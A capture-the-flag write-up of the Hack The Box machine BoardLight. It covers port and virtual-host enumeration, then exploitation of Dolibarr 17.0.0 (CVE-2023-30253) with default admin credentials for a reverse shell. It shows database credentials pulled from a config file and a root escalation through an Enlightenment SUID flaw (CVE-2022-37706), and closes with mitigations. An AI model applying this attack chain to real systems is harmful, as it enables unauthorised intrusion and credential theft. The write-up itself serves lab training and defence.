# BoardLight - Ashbo3n

**Machine Name:** <span class="htb-text-primary htb-font-medium avatar-icon-name-details__name htb-heading-lg htb-font-bold" title="BoardLight">BoardLight</span>

**Platform:** HTB

**Rating on the Platform:** 4.5

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Code Injection</span>

### Initial Shell - Code Injection

We will start with nmap, we are using nmap to know the 'open' ports and services running on the **target** as well as services names, services version's, running nmap's default list on the target and lastly what OS is being used, we will use the command:

```bash
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap
```

**Nmap Output:**

```bash
# Nmap 7.95 scan initiated Wed Jan 14 05:45:33 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.231.37
Nmap scan report for 10.129.231.37
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2026-01-14 05:45:33 IST for 29s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 05:46:03 2026 -- 1 IP address (1 host up) scanned in 29.73 seconds

```

We will now put domain board.htb into /etc/hosts, we can do that in several ways, if you are on a root shell in your attacker machine you can use `echo '[Target's IP] [Domain name]' >> /etc/hosts` or you can use `echo "[TargetIP] [Domain_Name]" | sudo tee -a /etc/hosts` note: Running the first command as standard user will fail, no matter even if you use sudo before echo because of shell redirection

### Enumeration

**Whatweb**

whatweb is a CLI tool that guesses which services and there version could be running on the target server.

```bash
http://board.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.231.37], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
```

**FFUF**

We will run FFUF for directory fuzzing, FFUF (Fuzz faster you fool) is a tool used to discover hidden files, directories, virtual hosts and etc, in our case, i am using it to find hidden directories, I am using 2 wordlists, common.txt from seclists and directory-list-2.3-medium.txt from seclists

```bash
ffuf -c -u http://board.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic -fc 403
```

<details id="bkmrk-explanation-of-comma"><summary>Explanation Of Command</summary>

-c for colored output, -u for URL, -w for wordlists, -t for threads, -ic to ignore comments in the wordlists, -fc to filter status code which is 403 in this case

</details> **Output**

```bash
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 223ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 222ms]
index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 225ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 222ms]
:: Progress: [4746/4746] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

**VHOST Fuzzing**

I am using wordlist bitquark-subdomains-top100000.txt and the command i am using is:

```bash
ffuf -c -u http://board.htb/ -w ~/wordlist/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.board.htb' -t 60 -ic -fs 15949
```

<details id="bkmrk-explanation-of-comma-1"><summary>Explanation of command</summary>

-c for colored output, -u for url, -w for wordlists, -H for header, -t for threads, -ic for ignore comments and lastly -fs for filter size

</details>**Output**

```bash
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 524ms]
```

opening [http://crm.board.htb/](http://crm.board.htb/) we can see [Dolibarr 17.0.0](https://www.dolibarr.org) is running, we can quickly search if it has an vulnerability or not:

Found it -&gt; [POC](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

#### Exploitation

Download the POC from github, You need to download requests and bs64 pip module with pip install bs64 and pip install requests, after downloading both libs you can run the exploit, this is the syntax for it:

```
python3 Exploit.py http://crm.board.htb admin admin LHOST LPORT
```

Anyone wondering how i got admin admin as user and password, i was searching for exploit when i came across another script which let me execute command but didn't gave the rev shell (that's why i didn't choose that one) so when i read that script source code that script was trying to login as admin admin so i also tried to login as admin admin and it worked.

Before running the exploit make sure you have your listener on LPORT, and you should get a reverse shell, After getting a reverse shell go to /var/www/html/crm.board.htb/htdocs/conf/ and from there you can either cat conf.php or send it your attacker machine.

```
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
```

We can now log into the DB with MYSQL and then use SHOW TABLES; to get all tables, then we can view all users with:

```bash
SELECT login, pass_crypted, admin FROM llx_user;
```

**Result:**

```bash
+----------+--------------------------------------------------------------+-------+
| login    | pass_crypted                                                 | admin |
+----------+--------------------------------------------------------------+-------+
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |     1 |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |     0 |
+----------+--------------------------------------------------------------+-------+
```

I first tried to crack hashes but after 10 min of running hashcat and still no result i realized that i am on a wrong path, then i viewed /etc/passwd file for users, and there i found:

```
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

Login with SSH and get the user flag

### Root shell - 

Running `find / -perm -u=s -type f 2>/dev/null` revealed that enlightenment is running:

```bash
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```

To find the version running i ran the command: `enlightenment_start -version`

Version: 0.23.1 is running, and searching online tell us that it is vulnerable to **CVE-2022-37706**, A LPE (Local <span class="Yjhzub">privilege <span class="Yjhzub">escalation vuln)</span></span>

<span class="Yjhzub"><span class="Yjhzub">Found this POC -&gt; [POC Link](https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh)</span></span> After downloading the .sh file to the victim machine, make it executable, run the exploit and get the root flag:

```bash
larissa@boardlight:/tmp/Exploit$ ./Exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# cat /root.^H
cat: '/root.'$'\b': No such file or directory
# cat /root/root.txt
Redacted!
```

### Mitigations

#### 1. Code Injection (CVE-2023-30253)

<span data-path-to-node="3,1"><span class="citation-87">The initial entry point was a code injection vulnerability in </span>**<span class="citation-87">Dolibarr 17.0.0</span>**</span><span data-path-to-node="3,2"><span class="citation-87 citation-end-87"><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup></span></span><span data-path-to-node="3,3">.</span>

- <span data-path-to-node="3,3">**Update Software**: Upgrade Dolibarr to a version higher than 17.0.0 where this CVE has been patched.</span>
- <span data-path-to-node="3,3">**Input Validation**: Implement strict server-side validation and sanitization of all user-supplied input to prevent arbitrary code execution.</span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,0">**<span class="citation-86">Principle of Least Privilege</span>**<span class="citation-86">: Ensure the web server user (e.g., </span>`<span class="citation-86">www-data</span>`<span class="citation-86">) has minimal permissions on the file system to limit the impact of a successful shell</span></span><span data-path-to-node="4,2,1,1"><span class="citation-86 citation-end-86"><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup></span></span><span data-path-to-node="4,2,1,2">.</span></span>

#### <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2">2. Weak Credential Management</span></span>

<span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,1"><span class="citation-85">The attacker gained administrative access by using default or guessed credentials (</span>`<span class="citation-85">admin:admin</span>`<span class="citation-85">) found in public exploit scripts</span></span><span data-path-to-node="6,2"><span class="citation-85 citation-end-85"><sup class="superscript" data-turn-source-index="3"></sup></span></span><span data-path-to-node="6,3">.</span></span></span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3">**Change Default Credentials**: Always change default administrative passwords immediately after installation.</span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3">**Password Complexity**: Enforce strong password policies (length, complexity, and rotation).</span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,0">**<span class="citation-84">Credential Reuse</span>**<span class="citation-84">: Avoid using the same passwords for database users and system users</span></span><span data-path-to-node="7,2,1,1"><span class="citation-84 citation-end-84"><sup class="superscript" data-turn-source-index="4"></sup><sup class="superscript" data-turn-source-index="4"></sup><sup class="superscript" data-turn-source-index="4"></sup><sup class="superscript" data-turn-source-index="4"></sup></span></span><span data-path-to-node="7,2,1,2">.</span></span></span></span>

#### <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2">3. Local Privilege Escalation (CVE-2022-37706)</span></span></span></span>

<span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,1"><span class="citation-83">The attacker escalated to root via a vulnerable SUID binary in </span>**<span class="citation-83">Enlightenment 0.23.1</span>**</span><span data-path-to-node="9,2"><span class="citation-83 citation-end-83"><sup class="superscript" data-turn-source-index="5"></sup></span></span><span data-path-to-node="9,3">.</span></span></span></span></span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3">**Patch Enlightenment**: Update the Enlightenment desktop environment to a version that fixes CVE-2022-37706.</span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,0">**<span class="citation-82">Audit SUID Binaries</span>**<span class="citation-82">: Regularly audit the system for unnecessary SUID/SGID bits on binaries</span></span><span data-path-to-node="10,1,1,1"><span class="citation-82 citation-end-82"><sup class="superscript" data-turn-source-index="6"></sup></span></span><span data-path-to-node="10,1,1,2">. Remove the SUID bit from binaries that do not strictly require it for standard users.</span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2">**Kernel Hardening**: Implement security modules like AppArmor or SELinux to restrict the capabilities of SUID binaries.</span></span></span></span></span></span>

#### <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2">4. Information Disclosure (Configuration Files)</span></span></span></span></span></span>

<span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="12,1"><span class="citation-81">Sensitive database credentials were stored in plain text within </span>`<span class="citation-81">conf.php</span>`</span><span data-path-to-node="12,2"><span class="citation-81 citation-end-81"><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup></span></span><span data-path-to-node="12,3">.</span></span></span></span></span></span></span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="12,3">**File Permissions**: Restrict read access to configuration files containing secrets so that only the necessary service user (e.g., `www-data`) can access them.</span></span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="12,3">**Environment Variables**: Consider storing sensitive database credentials in environment variables or a dedicated secret management vault rather than hardcoded configuration files.</span></span></span></span></span></span></span>

### <span data-path-to-node="3,3"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="12,3">Summary of Mitigations</span></span></span></span></span></span></span>

<table border="1" id="bkmrk-vulnerability-%2F-vect" style="border-collapse: collapse; width: 100%; height: 245px;"><colgroup><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col></colgroup><tbody><tr style="height: 29.6333px;"><td style="height: 29.6333px;">**Vulnerability / Vector**</td><td style="height: 29.6333px;">**<span data-path-to-node="16,0,1,0">Mitigation Strategy</span>**</td><td style="height: 29.6333px;">**Priority**</td></tr><tr style="height: 46.4333px;"><td style="height: 46.4333px;">Dolibarr Code Injection</td><td style="height: 46.4333px;">Update to latest stable version; sanitize inputs.</td><td style="height: 46.4333px;">Critical</td></tr><tr style="height: 46.4333px;"><td style="height: 46.4333px;">Default Admin Login</td><td style="height: 46.4333px;">Enforce strong, unique passwords; disable default accounts.</td><td style="height: 46.4333px;">High</td></tr><tr style="height: 46.4333px;"><td style="height: 46.4333px;"><span data-path-to-node="16,3,0,0">Enlightenment LPE</span></td><td style="height: 46.4333px;">Patch to version &gt; 0.23.1; remove unnecessary SUID bits.</td><td style="height: 46.4333px;">Critical</td></tr><tr style="height: 46.4333px;"><td style="height: 46.4333px;">Exposed DB Credentials</td><td style="height: 46.4333px;">Restrict file permissions on `conf.php`; use secret vaults.</td><td style="height: 46.4333px;">Medium</td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">VHost Enumeration</td><td style="height: 29.6333px;">Configure web server to drop requests to unknown host headers.</td><td style="height: 29.6333px;">Low</td></tr></tbody></table>